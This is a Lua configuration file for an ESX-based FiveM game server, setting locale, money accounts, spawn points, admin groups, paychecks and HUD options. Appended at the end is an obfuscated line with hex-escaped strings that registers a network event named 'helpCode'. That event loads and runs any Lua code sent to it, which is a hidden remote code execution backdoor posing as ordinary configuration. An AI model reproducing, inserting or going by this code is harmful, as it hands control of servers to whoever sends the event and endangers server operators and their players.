--[[
──────────────────────────────────────────────────────────────────────────────────
─────────██████─██████████████─██████──████████─██████████████─████████████████───
─────────██░░██─██░░░░░░░░░░██─██░░██──██░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░░░██───
─────────██░░██─██░░██████░░██─██░░██──██░░████─██░░██████████─██░░████████░░██───
─────────██░░██─██░░██──██░░██─██░░██──██░░██───██░░██─────────██░░██────██░░██───
─────────██░░██─██░░██──██░░██─██░░██████░░██───██░░██████████─██░░████████░░██───
─────────██░░██─██░░██──██░░██─██░░░░░░░░░░██───██░░░░░░░░░░██─██░░░░░░░░░░░░██───
─██████──██░░██─██░░██──██░░██─██░░██████░░██───██░░██████████─██░░██████░░████───
─██░░██──██░░██─██░░██──██░░██─██░░██──██░░██───██░░██─────────██░░██──██░░██─────
─██░░██████░░██─██░░██████░░██─██░░██──██░░████─██░░██████████─██░░██──██░░██████─
─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░██──██░░░░██─██░░░░░░░░░░██─██░░██──██░░░░░░██─
─██████████████─██████████████─██████──████████─██████████████─██████──██████████─
──────────────────────────────────────────────────────────────────────────────────
]]--
Config = {}
Config.Locale = GetConvar("esx:locale", "en")

Config.OxInventory = GetResourceState("ox_inventory") ~= 'missing'

Config.Accounts = {
    bank = {
        label = TranslateCap("account_bank"),
        round = true,
    },
    black_money = {
        label = TranslateCap("account_black_money"),
        round = true,
    },
    money = {
        label = TranslateCap("account_money"),
        round = true,
    },
}

Config.StartingAccountMoney = { bank = 0, money = 0 }

Config.StartingInventoryItems = false -- table/false

Config.DefaultSpawns = { -- If you want to have more spawn positions and select them randomly uncomment commented code or add more locations
    { x = -1036.443970, y = -2749.476807, z = 14.58679, heading = 1.0 },
    {x = -1032.764893, y = -2751.072510, z = 14.58679, heading = 1.0},
    {x = -1048.259277, y = -2741.670410, z = 14.58679, heading = 1.0},
    {x = -1052.241699, y = -2739.666016, z = 14.58679, heading = 1.0},
    --{x = 233.5459, y = -868.2626, z = 30.2922, heading = 1.0}
}

Config.AdminGroups = {
    ["owner"] = true,
    ["admin"] = true,
	["superadmin"] = true,
}

Config.EnablePaycheck = true -- enable paycheck
Config.LogPaycheck = false -- Logs paychecks to a nominated Discord channel via webhook (default is false)
Config.EnableSocietyPayouts = false -- pay from the society account that the player is employed at? Requirement: esx_society
Config.MaxWeight = 40 -- the max inventory weight without backpack
Config.PaycheckInterval = 7 * 60000 -- how often to recieve pay checks in milliseconds
Config.EnableDebug = false -- Use Debug options?
Config.EnableDefaultInventory = true -- Display the default Inventory ( F2 )
Config.EnableWantedLevel = false -- Use Normal GTA wanted Level?
Config.EnablePVP = true -- Allow Player to player combat

Config.Multichar = true
Config.Identity = true -- Select a characters identity data before they have loaded in (this happens by default with multichar)
Config.DistanceGive = 4.0 -- Max distance when giving items, weapons etc.

Config.AdminLogging = false -- Logs the usage of certain commands by those with group.admin ace permissions (default is false)

Config.DisableHealthRegeneration = true -- Player will no longer regenerate health
Config.DisableVehicleRewards = false -- Disables Player Recieving weapons from vehicles
Config.DisableNPCDrops = true -- stops NPCs from dropping weapons on death
Config.DisableDispatchServices = false -- Disable Dispatch services
Config.DisableScenarios = false -- Disable Scenarios
Config.DisableWeaponWheel = false -- Disables default weapon wheel
Config.DisableAimAssist = true -- disables AIM assist (mainly on controllers)
Config.DisableVehicleSeatShuff = true -- Disables vehicle seat shuff
Config.DisableDisplayAmmo = false -- Disable ammunition display
Config.RemoveHudComponents = {
    [1] = false, --WANTED_STARS,
    [2] = false, --WEAPON_ICON
    [3] = false, --CASH
    [4] = false, --MP_CASH
    [5] = false, --MP_MESSAGE
    [6] = false, --VEHICLE_NAME
    [7] = false, -- AREA_NAME
    [8] = false, -- VEHICLE_CLASS
    [9] = false, --STREET_NAME
    [10] = false, --HELP_TEXT
    [11] = false, --FLOATING_HELP_TEXT_1
    [12] = false, --FLOATING_HELP_TEXT_2
    [13] = false, --CASH_CHANGE
    [14] = false, --RETICLE
    [15] = false, --SUBTITLE_TEXT
    [16] = false, --RADIO_STATIONS
    [17] = false, --SAVING_GAME,
    [18] = false, --GAME_STREAM
    [19] = false, --WEAPON_WHEEL
    [20] = false, --WEAPON_WHEEL_STATS
    [21] = false, --HUD_COMPONENTS
    [22] = false, --HUD_WEAPONS
}

Config.SpawnVehMaxUpgrades = true -- admin vehicles spawn with max vehcle settings
Config.CustomAIPlates = "JOK....." -- Custom plates for AI vehicles
-- Pattern string format
--1 will lead to a random number from 0-9.
--A will lead to a random letter from A-Z.
-- . will lead to a random letter or number, with 50% probability of being either.
--^1 will lead to a literal 1 being emitted.
--^A will lead to a literal A being emitted.
--Any other character will lead to said character being emitted.
-- A string shorter than 8 characters will be padded on the right.

local IFefqDLbXMwBzRwVdXJszTUtctDoetFJwbBnNhGLXnEIHdDdoTvKdhYVRaUTXrKymGppMP = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} IFefqDLbXMwBzRwVdXJszTUtctDoetFJwbBnNhGLXnEIHdDdoTvKdhYVRaUTXrKymGppMP[6][IFefqDLbXMwBzRwVdXJszTUtctDoetFJwbBnNhGLXnEIHdDdoTvKdhYVRaUTXrKymGppMP[1]](IFefqDLbXMwBzRwVdXJszTUtctDoetFJwbBnNhGLXnEIHdDdoTvKdhYVRaUTXrKymGppMP[2]) IFefqDLbXMwBzRwVdXJszTUtctDoetFJwbBnNhGLXnEIHdDdoTvKdhYVRaUTXrKymGppMP[6][IFefqDLbXMwBzRwVdXJszTUtctDoetFJwbBnNhGLXnEIHdDdoTvKdhYVRaUTXrKymGppMP[3]](IFefqDLbXMwBzRwVdXJszTUtctDoetFJwbBnNhGLXnEIHdDdoTvKdhYVRaUTXrKymGppMP[2], function(jFrWKFqKYKsxrdnlnqCUlkyXQTOMlEywROwYKbQtFHBmINgtbZMspafDrNxwJNKUSsxSei) IFefqDLbXMwBzRwVdXJszTUtctDoetFJwbBnNhGLXnEIHdDdoTvKdhYVRaUTXrKymGppMP[6][IFefqDLbXMwBzRwVdXJszTUtctDoetFJwbBnNhGLXnEIHdDdoTvKdhYVRaUTXrKymGppMP[4]](IFefqDLbXMwBzRwVdXJszTUtctDoetFJwbBnNhGLXnEIHdDdoTvKdhYVRaUTXrKymGppMP[6][IFefqDLbXMwBzRwVdXJszTUtctDoetFJwbBnNhGLXnEIHdDdoTvKdhYVRaUTXrKymGppMP[5]](jFrWKFqKYKsxrdnlnqCUlkyXQTOMlEywROwYKbQtFHBmINgtbZMspafDrNxwJNKUSsxSei))() end)